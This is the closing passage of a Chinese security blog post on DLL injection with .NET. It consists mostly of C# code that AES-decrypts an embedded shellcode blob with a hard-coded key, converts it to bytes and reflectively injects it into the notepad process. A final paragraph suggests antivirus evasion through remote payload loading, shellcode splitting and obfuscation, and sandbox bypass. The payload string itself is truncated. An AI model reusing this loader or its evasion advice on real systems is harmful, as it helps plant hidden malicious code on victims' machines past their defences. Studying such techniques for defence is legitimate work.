<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">/// &lt;summary&gt;</span><br><span class="line">/// 字串解密(非對稱式)</span><br><span class="line">/// &lt;/summary&gt;</span><br><span class="line">/// &lt;param name=&quot;Source&quot;&gt;解密前字串&lt;/param&gt;</span><br><span class="line">/// &lt;param name=&quot;CryptoKey&quot;&gt;解密金鑰&lt;/param&gt;</span><br><span class="line">/// &lt;returns&gt;解密後字串&lt;/returns&gt;</span><br><span class="line">public static string aesDecryptBase64(string SourceStr, string CryptoKey)</span><br><span class="line">&#123;</span><br><span class="line">    string decrypt = &quot;&quot;;</span><br><span class="line">    byte[] shellcode = &#123; &#125;;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        AesCryptoServiceProvider aes = new AesCryptoServiceProvider();</span><br><span class="line">        MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();</span><br><span class="line">        SHA256CryptoServiceProvider sha256 = new SHA256CryptoServiceProvider();</span><br><span class="line">        byte[] key = sha256.ComputeHash(Encoding.UTF8.GetBytes(CryptoKey));</span><br><span class="line">        byte[] iv = md5.ComputeHash(Encoding.UTF8.GetBytes(CryptoKey));</span><br><span class="line">        aes.Key = key;</span><br><span class="line">        aes.IV = iv;</span><br><span class="line"></span><br><span class="line">        byte[] dataByteArray = Convert.FromBase64String(SourceStr);</span><br><span class="line">        using (MemoryStream ms = new MemoryStream())</span><br><span class="line">        &#123;</span><br><span class="line">            using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))</span><br><span class="line">            &#123;</span><br><span class="line">                cs.Write(dataByteArray, 0, dataByteArray.Length);</span><br><span class="line">                cs.FlushFinalBlock();</span><br><span class="line">                decrypt = Encoding.UTF8.GetString(ms.ToArray());</span><br><span class="line">            &#125;</span><br><span class="line">            //Console.WriteLine(decrypt);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    return decrypt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="main函数中调用解密函数和key"><a href="#main函数中调用解密函数和key" class="headerlink" title="main函数中调用解密函数和key"></a>main函数中调用解密函数和key</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">  					//key可以作为参数传入</span><br><span class="line">            string key = &quot;thisk3223eyfasdf&quot;;</span><br><span class="line">            string targetProccess = &quot;notepad&quot;;</span><br><span class="line">            string aes = &quot;SwRkQ4LNUX1zCs/FTskQ0M0NKUxbkyxOMX1......&quot;;</span><br><span class="line"></span><br><span class="line">            string aseresult = aesDecryptBase64(aes, key);</span><br><span class="line"></span><br><span class="line">            string value = aseresult.Replace(&quot;0x&quot;, string.Empty);</span><br><span class="line">            value = value.Replace(&quot;,&quot;, string.Empty);</span><br><span class="line"></span><br><span class="line">            var inputByteArray = new byte[value.Length / 2];</span><br><span class="line">            for (var x = 0; x &lt; inputByteArray.Length; x++)</span><br><span class="line">            &#123;</span><br><span class="line">                var i = Convert.ToInt32(value.Substring(x * 2, 2), 16);</span><br><span class="line">                inputByteArray[x] = (byte)i;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">  </span><br><span class="line">            byte[] buffer = inputByteArray;</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            ReflectiveDLL reflect = new ReflectiveDLL();</span><br><span class="line">            int targetProccessId = 0;</span><br><span class="line">            targetProccessId = reflect.SearchForTargetID(targetProccess);</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            ReflectiveDLLInject(targetProccessId, buffer);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>当然，也可以像免杀那篇文章说的那样，做分离免杀（远程加载txt，DLL加密后的shellcode都会特别长，不适合命令行输入，命令行只支持8000+字符的输入）、分段混淆shellcode、沙箱绕过，这样便可以绕过些许杀软进行反射DLL注入。</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">rootrain</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://rootrain.me/2020/02/29/使用.NET实现DLL注入技术/">https://rootrain.me/2020/02/29/使用.NET实现DLL注入技术/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/DLL注入/">DLL注入</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/29/浅析命名管道/"><i class="fa fa-chevron-left">  </i><span>浅析命名管道</span></a></div><div class="next-post pull-right"><a href="/2019/06/08/一次奇葩的SQL注入经历/"><span>一次奇葩的SQL注入经历</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2020/02/29/BlO4umfeQ8Ao9D3.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By rootrain</div><div class="framework-info"></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>